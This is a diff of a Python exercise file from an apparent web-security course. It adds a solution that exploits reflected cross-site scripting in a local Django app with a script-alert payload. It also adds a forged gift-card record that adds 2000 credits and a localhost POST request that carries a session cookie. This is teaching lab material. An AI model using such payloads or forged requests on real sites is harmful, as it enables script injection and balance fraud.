@@ -1,5 +1,4 @@
 # %%
-# w2d4_answers.py
 
 import os
 import sys
@@ -47,18 +46,24 @@ def exploit_xss_vulnerability():
         settings.ALLOWED_HOSTS.append("testserver")
 
     client = Client()
-    # TODO: Create XSS payload and test vulnerable endpoint
-    # - Create a malicious JavaScript payload
-    # - Replace the current response endpoint with the vulnerable one
-    response = client.get("/buy/1")
+    if "SOLUTION":
+        xss_payload = '<script>alert("XSS Attack!")</script>'
+
+        # Test the vulnerable endpoint
+        response = client.get(f"/buy/6?director={xss_payload}")
+    else:
+        # TODO: Create XSS payload and test vulnerable endpoint
+        # - Create a malicious JavaScript payload
+        # - Replace the current response endpoint with the vulnerable one
+        response = client.get("/buy/1")
 
     print(f"XSS exploit response status: {response.status_code}")
 
     if response.status_code == 200:
         response_content = response.content.decode()
-        if "xss_payload" in response_content:
+        if xss_payload in response_content:
             print("[+] XSS vulnerability successfully exploited!")
-            print(f"[+] Malicious payload found in response: {response_content['xss_payload']}")
+            print(f"[+] Malicious payload found in response: {xss_payload}")
             return True
         else:
             print("[-] XSS payload not found in response (may be escaped)")
@@ -72,3 +77,38 @@ from w2d4_test import test_exploit_xss_vulnerability
 
 if __name__ == "__main__":
     test_exploit_xss_vulnerability(exploit_xss_vulnerability)
+# %%
+# %%
+result = {
+    "merchant_id": "GPT-4 API Credits",
+    "customer_id": "test@test.com",
+    "total_value": "1",
+    "records": [
+        {"record_type": "amount_change", "amount_added": 2000, "signature": "74891960f9ab25d407967c106ddf4093"}
+    ],
+}
+
+# %%
+url = "http://127.0.0.1:8000/gift/1"
+headers = {
+    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Accept-Encoding": "gzip, deflate, br, zstd",
+    "Referer": "http://127.0.0.1:8000/gift/1",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Origin": "http://127.0.0.1:8000",
+    "Connection": "keep-alive",
+    "Cookie": "sessionid=zg8hd07t17ujbx4vqzdv4wzr8ci9rbvr",
+    "Upgrade-Insecure-Requests": "1",
+    "Sec-Fetch-Dest": "document",
+    "Sec-Fetch-Mode": "navigate",
+    "Sec-Fetch-Site": "same-origin",
+    "Sec-Fetch-User": "?1",
+    "DNT": "1",
+    "Sec-GPC": "1",
+    "Priority": "u=0, i",
+}
+data_raw = "amount=1^&username=test%40test.com^&xss_payload=helloworld"
+res = requests.post(url, data=data_raw, headers=headers)
+res.content
